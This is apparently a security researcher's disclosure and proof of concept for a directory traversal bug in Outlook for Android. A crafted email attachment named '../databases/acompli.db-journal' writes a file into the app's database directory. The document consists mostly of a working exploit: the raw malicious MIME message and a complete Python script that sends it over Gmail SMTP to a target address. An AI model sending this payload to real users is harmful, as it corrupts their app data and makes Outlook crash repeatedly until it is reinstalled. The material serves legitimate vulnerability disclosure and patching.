'''
There is a directory traversal issue in attachment downloads in Outlook for Android. There is no path sanitization on the attachment filename in the app. If the email account is a Hotmail account, this will be sanitized by the server, but for other accounts it will not be. This allows a file to be written anywhere on the filesystem that the Outlook app can access when an attached image is viewed in the Outlook app.

This bug has the following limitations:

1) the email address has to be a non-Hotmail address
2) the file can not overwrite an existing file (append happens in this case), it has to be a file that doesn't already exist.
3) the user has to click the image and view it, it is not sufficient just to view the thumbnail in the message.

It is possible to modify a database using this bug by placing a journal file in the databases directory.

Below is a PoC of an email that causes this issue. Attached is a python script that will send an email that causes this issue (don't forget to add in the to and from addresses, and your email credentials). WARNING: this PoC will cause Outlook to crash repeatedly, and you will need to re-install it to get it to work again

Content-Type: Content-Type: multipart/mixed; boundary="----714A286D976BF3E58D9D671E37CBCF7C"
MIME-Version: 1.0
Subject: hello image2adfdfs1
To: EMAIL
From: natashenka@google.com

You will not see this in a MIME-aware mail reader.

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: text/html

<html>
<body>
test
</body>
</html>

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: image/png; name="t124"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="../databases/acompli.db-journal"

2dUF+SChY9f/////AAAAABAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRyb2lkX21l
dGFkYXRhYW5kcm9pZF9tZXRhZGF0YQNDUkVBVEUgVEFCTEUgAAAARlkAAABFSgAAAEs7AAAASSw=

------714A286D976BF3E58D9D671E37CBCF7C
'''

import os
import sys
import smtplib
import mimetypes

from optparse import OptionParser

from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import subprocess
import random


def main():



    FROM_ADDRESS = "YOUR FROM ADDRESS HERE"
    YOUR_CREDENTIAL = "GET A GOOGLE ACCOUNT TEMPORARY PASSWORD AND PUT IT HERE"
    TO_ADDRESS = "ACCOUNT TO ATTACK HERE"



    composed = """Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary="----714A286D976BF3E58D9D671E37CBCF7C"
MIME-Version: 1.0
Subject: hello image2adfdfs1
To: """+ TO_ADDRESS +"""
From: """ + FROM_ADDRESS + """

You will not see this in a MIME-aware mail reader.

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: text/html

<html>
<body>
test
</body>
</html>

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: image/png; name="t124"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="../databases/acompli.db-journal"

2dUF+SChY9f/////AAAAABAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRyb2lkX21l
dGFkYXRhYW5kcm9pZF9tZXRhZGF0YQNDUkVBVEUgVEFCTEUgAAAARlkAAABFSgAAAEs7AAAASSw=

------714A286D976BF3E58D9D671E37CBCF7C"""




    s = smtplib.SMTP_SSL("smtp.gmail.com")
    s.login(FROM_ADDRESS, YOUR_CREDENTIAL)
    you = TO_ADDRESS
    s.sendmail(FROM_ADDRESS, you, composed)
    s.quit()


if __name__ == '__main__':
    main()